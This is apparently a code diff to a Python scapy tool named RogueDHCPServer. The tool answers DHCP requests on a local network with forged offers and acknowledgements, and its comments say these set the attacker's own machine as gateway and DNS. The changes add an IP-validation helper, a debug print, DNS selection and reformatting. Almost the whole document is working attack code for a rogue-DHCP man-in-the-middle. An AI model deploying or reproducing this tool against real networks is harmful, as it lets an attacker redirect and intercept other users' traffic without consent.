@@ -5,10 +5,20 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
 import threading
 import time
+import socket
 import ipaddress
 import argparse
 import configparser
 import logging
+
+print("DHCP loaded:", DHCP)
+
+def is_valid_ip(ip):
+    try:
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        return False
 
 # Configure logging
 logging.basicConfig(level=logging.INFO,
@@ -21,7 +31,7 @@ class RogueDHCPServer:
         self.ip_pool = ip_pool 
         self.subnet_mask = subnet_mask 
         self.gateway = gateway # Attacker's own machine IP, used as gateway
-        self.dns_servers = dns_servers # List of DNS servers to provide
+        self.dns_servers = dns_servers # List of DNS servers to provide to clients
         self.lease_time = lease_time # Duration for which the IP is booked
         self.allocated_ips = {}
         self.server_ip = gateway  # Using gateway IP as server IP
@@ -31,7 +41,7 @@ class RogueDHCPServer:
         self.available_ips = [str(ip) for ip in network.hosts()] # Skips broadcast and network addresses
         
     def handle_dhcp_discover(self, packet):
-        if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
+        if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # DHCP Discover
             client_mac = packet[Ether].src
             transaction_id = packet[BOOTP].xid
             
@@ -78,24 +88,28 @@ class RogueDHCPServer:
                 #    - lease_time: How long the client can keep the IP
                 #    - end: Marks end of DHCP options list
                 
+                valid_dns = [ip for ip in self.dns_servers if is_valid_ip(ip)]
 
                 dhcp_offer = Ether(src=get_if_hwaddr(self.interface), dst="ff:ff:ff:ff:ff:ff") / \
-                            IP(src=self.server_ip, dst="255.255.255.255") / \
-                            UDP(sport=67, dport=68) / \
-                            BOOTP(op=2, xid=transaction_id, yiaddr=offered_ip, siaddr=self.server_ip, 
-                                 chaddr=mac2str(client_mac)) / \
-                            DHCP(options=[("message-type", "offer"),
-                                         ("server_id", self.server_ip),
-                                         ("subnet_mask", self.subnet_mask),
-                                         ("router", self.gateway),
-                                         ("name_server", self.dns_servers),
-                                         ("lease_time", self.lease_time),
-                                         "end"])
+                    IP(src=self.server_ip, dst="255.255.255.255") / \
+                    UDP(sport=67, dport=68) / \
+                    BOOTP(op=2, xid=transaction_id, yiaddr=offered_ip, siaddr=self.server_ip, 
+                        chaddr=mac2str(client_mac)) / \
+                    DHCP(options=[
+                        ("message-type", "offer"),
+                        ("server_id", self.server_ip),
+                        ("subnet_mask", self.subnet_mask),
+                        ("router", self.gateway),
+                        ("name_server", valid_dns[0] if valid_dns else self.gateway),
+                        ("lease_time", self.lease_time),
+                        "end"
+                    ])
+
                 
                 sendp(dhcp_offer, iface=self.interface, verbose=0)
     
     def handle_dhcp_request(self, packet):
-        if DHCP in packet and packet[DHCP].options[0][1] == 3:  # DHCP Request
+        if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 3:  # DHCP Request
             client_mac = packet[Ether].src
             transaction_id = packet[BOOTP].xid
             
@@ -103,18 +117,23 @@ class RogueDHCPServer:
                 assigned_ip = self.allocated_ips[client_mac]
                 logger.info(f"Received DHCP Request from {client_mac} for IP {assigned_ip}")
 
+                valid_dns = [ip for ip in self.dns_servers if is_valid_ip(ip)]
+
                 dhcp_ack = Ether(src=get_if_hwaddr(self.interface), dst="ff:ff:ff:ff:ff:ff") / \
-                          IP(src=self.server_ip, dst="255.255.255.255") / \
-                          UDP(sport=67, dport=68) / \
-                          BOOTP(op=2, xid=transaction_id, yiaddr=assigned_ip, siaddr=self.server_ip, 
-                               chaddr=mac2str(client_mac)) / \
-                          DHCP(options=[("message-type", "ack"),
-                                       ("server_id", self.server_ip),
-                                       ("subnet_mask", self.subnet_mask),
-                                       ("router", self.gateway),
-                                       ("name_server", self.dns_servers),
-                                       ("lease_time", self.lease_time),
-                                       "end"])
+                    IP(src=self.server_ip, dst="255.255.255.255") / \
+                    UDP(sport=67, dport=68) / \
+                    BOOTP(op=2, xid=transaction_id, yiaddr=assigned_ip, siaddr=self.server_ip, 
+                        chaddr=mac2str(client_mac)) / \
+                    DHCP(options=[
+                        ("message-type", "ack"),
+                        ("server_id", self.server_ip),
+                        ("subnet_mask", self.subnet_mask),
+                        ("router", self.gateway),
+                        ("name_server", valid_dns[0] if valid_dns else self.gateway),
+                        ("lease_time", self.lease_time),
+                        "end"
+                    ])
+
                 
                 sendp(dhcp_ack, iface=self.interface, verbose=0)
                 logger.info(f"Sent DHCP Ack to {client_mac} with IP {assigned_ip}")
